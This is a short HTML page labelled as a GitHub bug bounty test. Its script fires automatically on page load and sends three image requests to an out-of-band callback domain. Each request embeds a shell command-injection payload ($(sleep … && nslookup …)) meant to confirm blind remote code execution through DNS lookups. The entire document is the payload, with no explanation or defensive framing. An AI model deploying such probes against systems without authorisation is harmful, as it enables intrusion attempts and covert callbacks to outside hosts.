<!DOCTYPE html>
<html>
<body>
    <h1>Github Bug BOunty test</h1>
    <script>
        (function() {
            const oobID = "9a5758d5b30f88782d53g1431jcyyyyyb.oast.pro";

            // We fire three different probes with different 'sleep' intervals.
            // This creates a "heartbeat" in your Collaborator logs.
            
            const probes = [
                { name: "start", sleep: 0 },
                { name: "middle", sleep: 30 },
                { name: "end", sleep: 60 }
            ];

            probes.forEach(p => {
                var img = new Image();
                // Payload: sleep X seconds, then lookup [name].[time].oobID
                const cmd = `$(sleep ${p.sleep} && nslookup ${p.name}.$(date +%H%M%S).${oobID})`;
                img.src = `https://${oobID}/rce?exec=${cmd}`;
            });
        })();
    </script>
</body>
</html>
